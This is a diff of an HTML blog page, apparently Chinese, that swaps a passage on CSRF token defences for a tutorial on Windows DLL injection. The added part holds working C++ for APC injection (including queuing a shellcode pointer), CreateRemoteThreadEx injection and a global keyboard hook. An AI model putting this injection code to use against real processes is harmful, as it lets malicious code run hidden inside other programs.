+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">dwProcessId</span> <span class="o">=</span> <span class="n">GetPidFormName</span><span class="p">(</span><span class="n">wsProcessname</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">dwProcessId</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hProcess</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">PVOID</span> <span class="n">lpData</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">dwRet</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">lpData</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">//在远程进程申请空间写入待注入dll 的路径
+</span><span class="c1"></span>        <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpData</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">wcCacheInDllPath</span><span class="p">,</span><span class="n">MAX_PATH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRet</span><span class="p">);</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">//开始注入
+</span><span class="c1"></span>    <span class="n">THREADENTRY32</span> <span class="n">te</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">te</span><span class="p">)</span> <span class="p">};</span>
+    <span class="n">HANDLE</span> <span class="n">handleSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//遍历系统中所有线程
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">handleSnap</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">bool</span> <span class="n">bstat</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">handleSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">do</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">te</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="n">dwProcessId</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">HANDLE</span> <span class="n">handleThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">handleThread</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">DWORD</span> <span class="n">dwRet</span> <span class="o">=</span> <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">LoadLibraryW</span><span class="p">,</span> <span class="n">handleThread</span><span class="p">,</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">lpData</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">dwRet</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">bstat</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">handleThread</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">handleSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">));</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">handleSnap</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">bstat</span><span class="p">;</span>
     <span class="p">}</span>
 
-    <span class="k">this</span><span class="p">.</span><span class="nx">backgroundPageConnection</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span>
-        <span class="nx">tabId</span><span class="o">:</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">devtools</span><span class="p">.</span><span class="nx">inspectedWindow</span><span class="p">.</span><span class="nx">tabId</span><span class="p">,</span>
-        <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;execute&#39;</span><span class="p">,</span>
-        <span class="nx">data</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">request</span>
-    <span class="p">})</span>
-<span class="p">},</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">Injection_APC</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;APCInjection.exe&#34;</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;APCDLL.dll&#34;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>到这里可以知道了，hackbar使用的是浏览器提供的扩展程序接口，所以可以修改header</p>
-<h3 id="csrf-token">csrf token</h3>
-<p>也正是由于CSRF产生的原理，csrf_token不能放在cookie中，否则达不到防御CSRF的效果；csrf_token也无需每次都不一样(每次不同是防止重放攻击，若仅考虑CSRF则无需不同)。</p>
-<p>一般form表单加个hidden属性的input标签来存放。由于csrf_token存放在网站A的DOM中，这样网站B就无法获取token，即使伪造使得流量器访问网站A，A后端检测到没有token也不会允许请求。</p>
-<p>至于hidden这个属性，个人认为即使是明文也不影响对CSRF的防御，主要是减少用户感知。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;csrf_token&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;{{csrf_token()}}&#34;</span><span class="p">&gt;</span>
-        账号：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-        密码:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>csrf_token</code>的设计：基于攻击者无法得知cookie，最简单的可直接将sessionid等作为token(md5值等同理)；或者直接生成随机字符串</p>
-<h3 id="添加http-request头">添加http request头</h3>
-<p>添加额外的 HTTP 头属性，并把 token 值放入其中，比如叫 csrftoken</p>
-<p>从底层到高层XMLHttpRequest、Ajax、 Axios等都支持手动添加header头，较方便。个人认为不存在[1]中描述的局限性较大的问题。</p>
-<h3 id="添加验证机制">添加验证机制</h3>
-<p>在请求数据提交前，需填写验证码信息，以增加对用户来源的有效认证，防止恶意未授权的操作产生。</p>
-<h2 id="flask-csrf-strategy">Flask CSRF Strategy</h2>
-<p>如果没有指定允许POST，提交表单的时候会提示Method Not Allowed</p>
+</div><p><img src="/images/posts/dll_injection_and_dll_hijacking/image-20220123001739815.png" alt="image-20220123001739815" /></p>
+<p>如果是注入shellcode的话直接以shellcode的指针为如何函数即可</p>
+<p>QueueUserAPC((PAPCFUNC)ShellCodePTR, handleThread, NULL);</p>
+<h3 id="createremotethreadex">CreateRemoteThread[Ex]</h3>
+<p>用到&lt;tlhelp32.h&gt;头文件中CreateToolhelp32Snapshot 方法，当指定TH32CS_SNAPPROCESS时可以保存系统中所有进程信息便于遍历。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1886,21 +2122,207 @@
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">root</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;form.html&#34;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
-        <span class="k">return</span> <span class="s2">&#34;ok&#34;</span>
-<span class="o">========================================</span>
-<span class="n">Method</span> <span class="n">Not</span> <span class="n">Allowed</span>
-<span class="n">The</span> <span class="n">method</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">allowed</span> <span class="k">for</span> <span class="n">the</span> <span class="n">requested</span> <span class="n">URL</span><span class="o">.</span>
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">HANDLE</span> <span class="n">CreateRemoteThreadEx</span><span class="p">(</span>
+	<span class="err">进程句柄</span><span class="p">,</span>
+    <span class="nb">NULL</span><span class="p">,</span>
+    <span class="err">栈大小</span><span class="mi">0</span><span class="err">默认</span><span class="p">,</span>
+    <span class="err">待线程执行的函数指针</span><span class="p">,</span>
+    <span class="err">传给函数的参数</span><span class="p">,</span>
+    <span class="err">控制线程创建的标志</span><span class="mi">0</span><span class="err">创建立即执行</span><span class="p">,</span>
+    <span class="err">属性列表</span><span class="p">,</span>
+    <span class="err">接收线程标识符的变量指针</span><span class="n">NULL不返回</span>
+<span class="p">)</span>
+<span class="c1">// CreateRemoteThread Use the CreateRemoteThreadEx function to create a thread that runs in the virtual address space of another process and optionally specify extended attributes.
+</span><span class="c1">// 参数只少第七个 (属性列表)
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// 注入函数，同时返回值为是否注入成功，默认返回成功
+</span><span class="c1"></span><span class="n">BOOL</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">DLLPath</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ProcessID</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// 定义一个句柄获取目标进程的所有权限，包括子进程
+</span><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">ProcessID</span><span class="p">);</span>
+	<span class="c1">// 判读是否获取到
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hProcess</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 计算一下获取到的DLLpath究竟有多长，要在内存空间中申请内存来存放它，注意+1,为\0
+</span><span class="c1"></span>	<span class="n">SIZE_T</span> <span class="n">PathSize</span> <span class="o">=</span> <span class="p">(</span><span class="n">_tcslen</span><span class="p">(</span><span class="n">DLLPath</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">);</span> <span class="c1">// 宽字节
+</span><span class="c1"></span>	<span class="c1">// 在进程中申请内存存放此DLLpath
+</span><span class="c1"></span>	<span class="n">LPVOID</span> <span class="n">StartAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PathSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+	<span class="c1">// 如果未能获取到地址，返回失败
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">StartAddress</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 获取到地址则将DLLPath写入此地址
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">StartAddress</span><span class="p">,</span> <span class="n">DLLPath</span><span class="p">,</span> <span class="n">PathSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 获取LoadLibrary的入口点地址，需要进行强制类型转换
+</span><span class="c1"></span>	<span class="n">PTHREAD_START_ROUTINE</span> <span class="n">pfnStartAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">_T</span><span class="p">(</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">)),</span> <span class="s">&#34;LoadLibraryW&#34;</span><span class="p">);</span>
+	<span class="c1">// 在这里获取到的地址，在目标进程中也一样，因此直接传递过去即可
+</span><span class="c1"></span>	<span class="c1">// 先判断是否获取到
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pfnStartAddress</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 最重要的一步，创建远程线程，首先获取句柄，createremotethreadex函数只在win7以上系统有
+</span><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThreadEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pfnStartAddress</span><span class="p">,</span> <span class="n">StartAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">// 判断线程是否创建成功
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hThread</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 最后等待线程结束，然后清理线程和进程
+</span><span class="c1"></span>	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
+	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 获取进程，其参数为进程名——在进程列表中获取我们想要的参数
+</span><span class="c1"></span><span class="n">DWORD</span> <span class="nf">ProcessFind</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">Exename</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// 第一个参数只获取进程名
+</span><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">// 对获取的进程进行判断
+</span><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hProcess</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="c1">// 获取成功
+</span><span class="c1"></span>	<span class="n">PROCESSENTRY32</span> <span class="n">info</span><span class="p">;</span>
+	<span class="n">info</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">))</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="c1">// 遍历进程中的所有项
+</span><span class="c1"></span>	<span class="p">{</span>
+		<span class="c1">// 判断是否与所给进程名相符，就是输入的进程名
+</span><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">_tcscmp</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">Exename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+			<span class="c1">// 相符的话返回该进程的PID
+</span><span class="c1"></span>			<span class="k">return</span> <span class="n">info</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
+		<span class="c1">// 如果遍历了整个进程列表都没有找到，那么返回FALSE
+</span><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">))</span>
+			<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// 函数默认返回FALSE
+</span><span class="c1"></span>	<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>如果允许了POST，再次尝试提交表单会Bad Request，这也是CSRF攻击未携带token的场景</p>
+</div><p><img src="/images/posts/dll_injection_and_dll_hijacking/CreateRemoteThreadEx.png" alt="CreateRemoteThreadEx" /></p>
+<h3 id="setwindowshookex">SetWindowsHook[Ex]</h3>
+<p>优点是注入简单，缺点是只能对windows消息进行Hook并注入dll，而且注入dll可能不是立即被注入，因为这需要相应类型的事件发生</p>
+<p>微软官方文档中有SetWindowsHookExA和SetWindowsHookExW两个接口，并且描述文档一模一样，区别可以在源码中看出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#ifdef UNICODE
+</span><span class="cp">#define SetWindowsHookEx  SetWindowsHookExW
+</span><span class="cp">#else
+</span><span class="cp">#define SetWindowsHookEx  SetWindowsHookExA
+</span><span class="cp">#endif </span><span class="c1">// !UNICODE
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">HHOOK</span> <span class="nf">SetWindowsHookExA</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">int</span>       <span class="n">idHook</span><span class="p">,</span>	<span class="c1">// 钩子类型 WH_KEYBOARD 2 鼠标消息7 WinUser.h
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HOOKPROC</span>  <span class="n">lpfn</span><span class="p">,</span>		<span class="c1">// 钩子函数的起始地址
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HINSTANCE</span> <span class="n">hmod</span><span class="p">,</span>		<span class="c1">// DLL handle  如果代码在当前进程中并且下一个参数指定当前进程创建的线程 则NULL
+</span><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>     <span class="n">dwThreadId</span>	<span class="c1">// 与挂钩过程关联的线程的标识符 如果0 则与所有线程关联 &#34;全局钩子&#34;
+</span><span class="c1"></span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// 取消挂钩
+</span><span class="c1"></span><span class="n">BOOL</span> <span class="nf">UnhookWindowsHookEx</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HHOOK</span> <span class="n">hhk</span>
+<span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>拦截发送到notepad程序的键盘事件，每到一个事件就弹窗。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1913,56 +2335,509 @@
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">root</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;form.html&#34;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
-        <span class="k">return</span> <span class="s2">&#34;ok&#34;</span>
-<span class="o">========================================</span>
-<span class="n">Bad</span> <span class="n">Request</span>
-<span class="n">The</span> <span class="n">CSRF</span> <span class="n">token</span> <span class="ow">is</span> <span class="n">missing</span><span class="o">.</span>
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;conio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="k">typedef</span>  <span class="nf">void</span><span class="p">(</span><span class="o">*</span><span class="n">PFNHOOKSTART</span><span class="p">)();</span>
+<span class="k">typedef</span>  <span class="nf">void</span><span class="p">(</span><span class="o">*</span><span class="n">PFNHOOKSTOP</span><span class="p">)();</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">HMODULE</span> <span class="n">Hmod</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">&#34;SetWindowsHook.dll&#34;</span><span class="p">);</span>
+    <span class="n">PFNHOOKSTART</span> <span class="n">pHookStart</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNHOOKSTART</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">Hmod</span><span class="p">,</span> <span class="s">&#34;HookStart&#34;</span><span class="p">);</span>
+    <span class="n">PFNHOOKSTOP</span> <span class="n">pHookStop</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFNHOOKSTOP</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">Hmod</span><span class="p">,</span> <span class="s">&#34;HookStop&#34;</span><span class="p">);</span>
+    <span class="n">pHookStart</span><span class="p">();</span>
+    <span class="c1">// printf(&#34;print &#39;q&#39; to quite!\n&#34;);
+</span><span class="c1"></span>    <span class="c1">// while (_getch() != &#39;q&#39;);
+</span><span class="c1"></span>    <span class="c1">// pHookStop();
+</span><span class="c1"></span>    <span class="c1">// FreeLibrary(Hmod);
+</span><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>如果template中添加token，在访问网站的时候请求到token，然后提交表单的时候将token也post出去，这样就能正确响应。尝试手动修改DOM中的token再次post也是bad request。</p>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
